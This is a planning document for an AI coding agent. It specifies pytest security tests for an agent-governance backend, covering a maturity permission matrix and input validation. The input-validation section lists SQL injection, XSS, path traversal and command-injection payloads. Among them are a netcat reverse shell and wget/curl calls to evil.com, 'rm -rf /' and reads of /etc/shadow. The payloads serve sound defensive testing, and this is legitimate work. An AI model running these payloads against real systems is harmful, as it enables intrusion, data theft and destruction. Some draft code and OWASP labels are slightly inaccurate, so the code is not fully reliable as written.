---
phase: 03-integration-security-tests
plan: 03
type: execute
wave: 1
depends_on: []
files_modified:
  - backend/tests/security/test_authorization.py
  - backend/tests/security/test_input_validation.py
autonomous: true

must_haves:
  truths:
    - Agent maturity permission matrix is enforced (4x4 combinations tested)
    - Action complexity levels are properly validated
    - SQL injection payloads are blocked and sanitized
    - XSS payloads are sanitized in responses and database
    - Path traversal attempts are blocked
  artifacts:
    - path: backend/tests/security/test_authorization.py
      contains: "test_maturity_permission"
      min_lines: 250
    - path: backend/tests/security/test_input_validation.py
      contains: "sql_injection"
      min_lines: 200
  key_links:
    - from: backend/tests/security/test_authorization.py
      to: backend/core/agent_governance_service.py
      pattern: "can_perform_action"
    - from: backend/tests/security/test_authorization.py
      to: backend/core/trigger_interceptor.py
      pattern: "should_block"
---
<objective>
Create authorization and input validation security tests covering agent maturity permissions and OWASP Top 10 vulnerabilities.

Purpose: Test authorization (agent maturity permissions, action complexity matrix) as required by SECU-02 and input validation (SQL injection, XSS, path traversal) as required by SECU-03.

Output: Security test files for authorization enforcement and input validation sanitization.
</objective>

<execution_context>
@/Users/rushiparikh/.claude/get-shit-done/workflows/execute-plan.md
@/Users/rushiparikh/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/REQUIREMENTS.md
@.planning/phases/03-integration-security-tests/03-RESEARCH.md

@backend/core/agent_governance_service.py
@backend/core/trigger_interceptor.py
@backend/core/models.py
@backend/tests/factories/agent_factory.py
@backend/tests/security/conftest.py
</context>

<tasks>

<task type="auto">
  <name>Create authorization tests for agent maturity permissions (SECU-02)</name>
  <files>backend/tests/security/test_authorization.py</files>
  <action>
    Create comprehensive authorization tests for agent maturity permission matrix:

    Test all 4 maturity levels x 4 action complexity levels = 16 combinations:
    - STUDENT (<0.5 confidence): Blocked from all automated triggers
    - INTERN (0.5-0.7): Proposals only, human approval required
    - SUPERVISED (0.7-0.9): Run under supervision, real-time monitoring
    - AUTONOMOUS (>0.9): Full execution, all actions

    Action Complexity:
    - 1 (LOW): Presentations → STUDENT+
    - 2 (MODERATE): Streaming → INTERN+
    - 3 (HIGH): State changes → SUPERVISED+
    - 4 (CRITICAL): Deletions → AUTONOMOUS only

    ```python
    """
    Authorization security tests (SECU-02).

    Tests cover:
    - Agent maturity permission matrix (4x4 combinations)
    - Action complexity enforcement
    - Governance checks
    - Permission boundaries
    """
    import pytest
    from fastapi.testclient import TestClient
    from sqlalchemy.orm import Session
    from tests.factories.agent_factory import (
        StudentAgentFactory,
        InternAgentFactory,
        SupervisedAgentFactory,
        AutonomousAgentFactory
    )
    from tests.factories.user_factory import UserFactory
    from core.models import AgentStatus

    # Test data: Maturity level x Action complexity = expected result
    MATURITY_ACTION_MATRIX = [
        # (agent_factory, action_type, complexity, expected_status, description)
        # STUDENT agents - blocked from all triggers
        (StudentAgentFactory, "present", 1, 200, "STUDENT can present (read-only)"),
        (StudentAgentFactory, "stream", 2, 403, "STUDENT blocked from streaming"),
        (StudentAgentFactory, "state_change", 3, 403, "STUDENT blocked from state changes"),
        (StudentAgentFactory, "delete", 4, 403, "STUDENT blocked from deletions"),

        # INTERN agents - proposals only for moderate+
        (InternAgentFactory, "present", 1, 200, "INTERN can present"),
        (InternAgentFactory, "stream", 2, 202, "INTERN streaming requires approval"),
        (InternAgentFactory, "state_change", 3, 202, "INTERN state change requires approval"),
        (InternAgentFactory, "delete", 4, 403, "INTERN blocked from deletions"),

        # SUPERVISED agents - supervision for high actions
        (SupervisedAgentFactory, "present", 1, 200, "SUPERVISED can present"),
        (SupervisedAgentFactory, "stream", 2, 200, "SUPERVISED can stream"),
        (SupervisedAgentFactory, "state_change", 3, 202, "SUPERVISED state change under supervision"),
        (SupervisedAgentFactory, "delete", 4, 403, "SUPERVISED blocked from deletions"),

        # AUTONOMOUS agents - full execution
        (AutonomousAgentFactory, "present", 1, 200, "AUTONOMOUS can present"),
        (AutonomousAgentFactory, "stream", 2, 200, "AUTONOMOUS can stream"),
        (AutonomousAgentFactory, "state_change", 3, 200, "AUTONOMOUS can change state"),
        (AutonomousAgentFactory, "delete", 4, 200, "AUTONOMOUS can delete"),
    ]

    class TestMaturityPermissionMatrix:
        """Test agent maturity permission matrix enforcement."""

        @pytest.mark.parametrize("agent_factory,action,complexity,expected,description", MATURITY_ACTION_MATRIX)
        def test_maturity_action_combinations(
            self,
            client: TestClient,
            db_session: Session,
            admin_token: str,
            agent_factory,
            action,
            complexity,
            expected,
            description
        ):
            """
            Test all maturity level x action complexity combinations.

            This is a CRITICAL security test ensuring governance enforcement.
            """
            # Given: Agent with specific maturity level
            agent = agent_factory()
            db_session.add(agent)
            db_session.commit()

            # When: Attempt action
            endpoint_map = {
                "present": f"/api/agents/{agent.id}/present",
                "stream": f"/api/agents/{agent.id}/stream",
                "state_change": f"/api/agents/{agent.id}/state",
                "delete": f"/api/agents/{agent.id}",
            }

            response = client.post(
                endpoint_map[action],
                headers={"Authorization": f"Bearer {admin_token}"},
                json={"complexity": complexity} if action != "delete" else None
            )

            # Then: Enforce expected status
            assert response.status_code == expected, \
                f"Failed for {description}: got {response.status_code}, expected {expected}"

            # Verify governance enforcement message for blocked actions
            if expected == 403:
                data = response.json()
                detail = data.get("detail", "").lower()
                assert any(term in detail for term in ["blocked", "permission", "autonomous", "maturity"]), \
                    f"Governance error message missing for {description}"

        def test_student_blocked_from_all_triggers(self, client: TestClient, db_session: Session, admin_token: str):
            """Test STUDENT agent is completely blocked from automated triggers."""
            agent = StudentAgentFactory()
            db_session.add(agent)
            db_session.commit()

            response = client.post(
                f"/api/agents/{agent.id}/trigger",
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            assert response.status_code == 403
            data = response.json()
            assert "blocked" in data.get("detail", "").lower() or \
                   "training" in data.get("detail", "").lower()

        def test_intern_requires_approval_for_state_changes(self, client: TestClient, db_session: Session, admin_token: str):
            """Test INTERN agent triggers approval workflow for state changes."""
            agent = InternAgentFactory()
            db_session.add(agent)
            db_session.commit()

            response = client.post(
                f"/api/agents/{agent.id}/state",
                json={"new_state": "processing"},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should return 202 (accepted) for proposal, not immediate execution
            assert response.status_code == 202
            data = response.json()
            # Should include proposal_id for approval workflow
            assert "proposal_id" in data or "status" in data

        def test_supervised_requires_supervision_for_critical_actions(self, client: TestClient, db_session: Session, admin_token: str):
            """Test SUPERVISED agent runs under supervision for critical actions."""
            agent = SupervisedAgentFactory()
            db_session.add(agent)
            db_session.commit()

            response = client.post(
                f"/api/agents/{agent.id}/execute",
                json={"action": "critical_operation", "complexity": 3},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should either return 202 (supervision started) or 200 with supervision context
            assert response.status_code in [200, 202]
            if response.status_code == 202:
                data = response.json()
                assert "supervision" in str(data).lower() or "session" in str(data).lower()

        def test_autonomous_full_execution(self, client: TestClient, db_session: Session, admin_token: str):
            """Test AUTONOMOUS agent has full execution权限."""
            agent = AutonomousAgentFactory()
            db_session.add(agent)
            db_session.commit()

            # AUTONOMOUS should be able to execute all actions
            for action, endpoint_suffix in [
                ("present", f"/api/agents/{agent.id}/present"),
                ("stream", f"/api/agents/{agent.id}/stream"),
                ("state", f"/api/agents/{agent.id}/state"),
            ]:
                response = client.post(
                    endpoint_suffix,
                    headers={"Authorization": f"Bearer {admin_token}"},
                    json={"test": True}
                )
                # Should not be blocked by governance
                assert response.status_code not in [403], \
                    f"AUTONOMOUS agent blocked from {action}"

    class TestGovernanceCaching:
        """Test governance cache doesn't bypass security."""

        def test_governance_cache_consistent_with_database(self, client: TestClient, db_session: Session, admin_token: str):
            """Test governance cache returns consistent decisions."""
            from core.governance_cache import get_governance_cache

            agent = StudentAgentFactory()
            db_session.add(agent)
            db_session.commit()

            # First check - database
            from core.agent_governance_service import AgentGovernanceService
            governance = AgentGovernanceService(db_session)

            db_result = governance.can_perform_action(
                agent_id=agent.id,
                action_type="delete"
            )

            # Second check - cache
            cache = get_governance_cache(db_session)
            cache_result = cache.check_permission(
                agent_id=agent.id,
                action_type="delete"
            )

            # Both should agree (STUDENT blocked from delete)
            assert db_result["allowed"] == cache_result["allowed"]
            assert db_result["allowed"] == False

        def test_cache_invalidation_on_maturity_change(self, client: TestClient, db_session: Session, admin_token: str):
            """Test cache invalidates when agent maturity changes."""
            agent = StudentAgentFactory()
            db_session.add(agent)
            db_session.commit()

            from core.governance_cache import get_governance_cache
            cache = get_governance_cache(db_session)

            # Check initial permission (should be blocked)
            result1 = cache.check_permission(agent.id, "delete")
            assert result1["allowed"] == False

            # Promote agent to AUTONOMOUS
            agent.status = AgentStatus.AUTONOMOUS.value
            agent.confidence_score = 0.95
            db_session.commit()

            # Invalidate cache
            cache.invalidate(agent.id)

            # Check new permission (should be allowed)
            result2 = cache.check_permission(agent.id, "delete")
            assert result2["allowed"] == True

    class TestPermissionBoundaries:
        """Test permission boundaries between maturity levels."""

        def test_cannot_bypass_maturity_with_direct_api_call(self, client: TestClient, db_session: Session):
            """Test maturity check cannot be bypassed with direct API call."""
            student = StudentAgentFactory()
            db_session.add(student)
            db_session.commit()

            # Try to directly call internal execution endpoint
            response = client.post(
                f"/api/agents/{student.id}/internal/execute",
                json={"action": "delete_all"},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should still enforce governance
            assert response.status_code == 403

        def test_maturity_upgrade_requires_graduation(self, client: TestClient, db_session: Session, admin_token: str):
            """Test maturity upgrade requires proper graduation process."""
            student = StudentAgentFactory(confidence_score=0.4)
            db_session.add(student)
            db_session.commit()

            # Try to directly upgrade to AUTONOMOUS
            response = client.put(
                f"/api/agents/{student.id}",
                json={"status": "autonomous", "confidence_score": 0.95},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should reject invalid maturity jump without graduation
            assert response.status_code in [400, 403]
    ```

    Ensure tests cover:
    - All 16 maturity/complexity combinations
    - STUDENT blocking from triggers
    - INTERN approval workflow
    - SUPERVISED supervision requirement
    - AUTONOMOUS full execution
    - Cache consistency and invalidation
  </action>
  <verify>grep -c "def test_" backend/tests/security/test_authorization.py</verify>
  <done>
    At least 12 test methods covering maturity permission matrix
    Tests include parameterized 4x4 matrix testing
    Tests validate governance enforcement messages
  </done>
</task>

<task type="auto">
  <name>Create input validation security tests (SECU-03)</name>
  <files>backend/tests/security/test_input_validation.py</files>
  <action>
    Create comprehensive input validation tests covering OWASP Top 10 vulnerabilities:

    Test payloads for:
    - SQL Injection (OWASP A01:2021)
    - XSS (Cross-Site Scripting) (OWASP A03:2021)
    - Path Traversal (OWASP A01:2021)
    - Command Injection
    - LDAP Injection
    - NoSQL Injection

    ```python
    """
    Input validation security tests (SECU-03).

    Tests cover:
    - SQL injection prevention
    - XSS prevention
    - Path traversal prevention
    - Command injection prevention
    - OWASP Top 10 API security vulnerabilities
    """
    import pytest
    from fastapi.testclient import TestClient
    from sqlalchemy.orm import Session
    from tests.factories.user_factory import UserFactory, AdminUserFactory

    # OWASP-based exploit payloads
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' UNION SELECT NULL, NULL, NULL--",
        "' OR 1=1#",
        "admin'/*",
        "' OR '1'='1'--",
        "1' AND 1=1--",
        "'; SELECT * FROM users WHERE '1'='1",
        "' UNION SELECT username, password FROM users--",
        "1'; EXEC master..xp_cmdshell 'dir';--",
        "'; INSERT INTO users VALUES ('hacker', 'password');--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "1' OR '1'='1' ORDER BY 1--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "<iframe src='javascript:alert(XSS)'>",
        "<body onfocus=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<embed src='javascript:alert(XSS)'>",
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
        "....//....//....//windows//system32//drivers//etc//hosts",
    ]

    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(curl evil.com)",
        ";wget http://evil.com/shell.txt",
        "|nc -e /bin/sh evil.com 4444",
        "; rm -rf /",
        "&& cat /etc/shadow",
        "|nslookup evil.com",
    ]

    class TestSQLInjectionPrevention:
        """Test SQL injection attempts are blocked (OWASP A01:2021)."""

        @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
        def test_sql_injection_in_search_blocked(self, client: TestClient, admin_token: str, payload):
            """Test SQL injection in search parameters is blocked."""
            response = client.get(
                "/api/agents/search",
                params={"query": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should reject or sanitize
            # Should NOT return database error or leak schema
            assert response.status_code in [400, 422, 200]
            if response.status_code in [400, 422]:
                # Validation error - good
                pass
            else:
                # If 200, verify no SQL error in response
                assert "sql" not in response.text.lower()
                assert "syntax" not in response.text.lower()
                assert "ora-" not in response.text.lower()
                assert "mysql" not in response.text.lower()

        @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS[:5])
        def test_sql_injection_in_agent_name_blocked(self, client: TestClient, admin_token: str, db_session: Session, payload):
            """Test SQL injection in agent name is blocked."""
            response = client.post(
                "/api/agents",
                json={
                    "name": payload,
                    "category": "testing",
                    "module_path": "test.module",
                    "class_name": "TestClass"
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should reject or escape
            assert response.status_code in [400, 422, 201]

        def test_sql_injection_doesnt_leak_schema(self, client: TestClient, admin_token: str):
            """Test SQL injection doesn't leak database schema."""
            payload = "1' UNION SELECT table_name FROM information_schema.tables--"
            response = client.get(
                "/api/agents",
                params={"name": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should NOT leak table names
            assert "users" not in response.text.lower()
            assert "agents" not in response.text.lower()
            assert "table_name" not in response.text.lower()

    class TestXSSPrevention:
        """Test XSS attempts are sanitized (OWASP A03:2021)."""

        @pytest.mark.parametrize("payload", XSS_PAYLOADS)
        def test_xss_in_description_sanitized(self, client: TestClient, admin_token: str, db_session: Session, payload):
            """Test XSS in agent description is sanitized."""
            response = client.post(
                "/api/agents",
                json={
                    "name": "TestAgent",
                    "description": payload,
                    "category": "testing"
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            if response.status_code == 201:
                # Verify sanitized in response
                assert "<script>" not in response.text
                assert "javascript:" not in response.text
                assert "onerror=" not in response.text

                # Verify sanitized in database
                from core.models import AgentRegistry
                agent = db_session.query(AgentRegistry).filter(
                    AgentRegistry.name == "TestAgent"
                ).first()
                assert agent is not None
                assert "<script>" not in agent.description
                assert "javascript:" not in agent.description

        def test_xss_not_reflected_in_json_response(self, client: TestClient, admin_token: str):
            """Test XSS payload is not reflected in JSON response."""
            payload = "<script>alert('XSS')</script>"

            response = client.get(
                "/api/agents",
                params={"search": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Response should escape or remove script tags
            assert "<script>" not in response.text

        def test_xss_with_content_type_html(self, client: TestClient, admin_token: str):
            """Test XSS with HTML content type is handled safely."""
            payload = "<img src=x onerror=alert('XSS')>"

            response = client.post(
                "/api/canvas/component",
                json={
                    "name": "TestComponent",
                    "html": payload,
                    "component_type": "generic"
                },
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # If component created, should be stored safely
            # Should not execute when retrieved
            if response.status_code == 201:
                assert "onerror" not in response.text or "escaped" in response.text.lower()

    class TestPathTraversalPrevention:
        """Test path traversal attempts are blocked (OWASP A01:2021)."""

        @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
        def test_path_traversal_in_file_operations_blocked(self, client: TestClient, admin_token: str, payload):
            """Test path traversal in file operations is blocked."""
            response = client.post(
                "/api/tools/browser/screenshot",
                json={"file_path": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should reject path traversal
            assert response.status_code in [400, 403, 404]

            # Should NOT return file contents
            assert "root:" not in response.text
            assert "[extensions]" not in response.text

        def test_path_traversal_in_export_blocked(self, client: TestClient, admin_token: str):
            """Test path traversal in canvas export is blocked."""
            payload = "../../../etc/passwd"

            response = client.get(
                "/api/canvas/export",
                params={"file_path": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            assert response.status_code in [400, 403, 404]
            assert "root:" not in response.text

        def test_double_encoding_path_traversal_blocked(self, client: TestClient, admin_token: str):
            """Test double-encoded path traversal is blocked."""
            payload = "%252e%252e%252fetc%252fpasswd"  # Double-encoded ../

            response = client.post(
                "/api/files/read",
                json={"path": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            assert response.status_code in [400, 403, 404]

    class TestCommandInjectionPrevention:
        """Test command injection attempts are blocked."""

        @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
        def test_command_injection_in_shell_operations_blocked(self, client: TestClient, admin_token: str, payload):
            """Test command injection in shell operations is blocked."""
            response = client.post(
                "/api/tools/execute",
                json={"command": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should reject or sanitize
            assert response.status_code in [400, 403, 422]

        def test_pipe_injection_blocked(self, client: TestClient, admin_token: str):
            """Test pipe injection is blocked."""
            payload = "cat /etc/passwd | grep root"

            response = client.post(
                "/api/tools/execute",
                json={"command": payload},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            assert response.status_code in [400, 403, 422]
            assert "root:" not in response.text

    class TestInputValidationWithPydantic:
        """Test Pydantic model validation prevents malicious input."""

        def test_email_validation_prevents_injection(self, client: TestClient):
            """Test email validation rejects injection attempts."""
            malicious_emails = [
                "test@example.com'; DROP TABLE users; --",
                "test@example.com<script>",
                "test@example.com\x00admin",
            ]

            for email in malicious_emails:
                response = client.post("/api/auth/signup", json={
                    "email": email,
                    "password": "ValidPass123!"
                })

                # Should reject invalid emails
                assert response.status_code in [400, 422]

        def test_integer_validation_prevents_overflow(self, client: TestClient, admin_token: str):
            """Test integer parameters reject overflow values."""
            response = client.get(
                "/api/agents",
                params={"limit": 999999999999999999999},
                headers={"Authorization": f"Bearer {admin_token}"}
            )

            # Should validate and clamp/reject
            assert response.status_code in [400, 422, 200]
            if response.status_code == 200:
                data = response.json()
                # Verify limited results
                if "agents" in data:
                    assert len(data["agents"]) <= 100
    ```

    Ensure tests cover:
    - SQL injection (15+ payloads)
    - XSS (15+ payloads)
    - Path traversal (10+ payloads)
    - Command injection
    - Double encoding attacks
    - Pydantic validation edge cases
  </action>
  <verify>grep -c "def test_" backend/tests/security/test_input_validation.py</verify>
  <done>
    At least 20 test methods covering SQL injection, XSS, path traversal, command injection
    Tests use OWASP-based payload lists
    Tests verify sanitization in both response and database
  </done>
</task>

</tasks>

<verification>
After completion:
1. Run authorization tests: pytest backend/tests/security/test_authorization.py -v
2. Run input validation tests: pytest backend/tests/security/test_input_validation.py -v
3. Verify all 16 maturity/complexity combinations tested
4. Verify OWASP payloads are properly blocked
5. Run in parallel: pytest backend/tests/security/test_authorization.py backend/tests/security/test_input_validation.py -n auto
</verification>

<success_criteria>
1. Agent maturity permission matrix fully tested (SECU-02)
2. Input validation covers OWASP Top 10 vulnerabilities (SECU-03)
3. At least 32 security test methods created
4. All SQL injection payloads blocked
5. All XSS payloads sanitized
6. All path traversal attempts blocked
</success_criteria>

<output>
After completion, create `.planning/phases/03-integration-security-tests/03-03-SUMMARY.md`
</output>
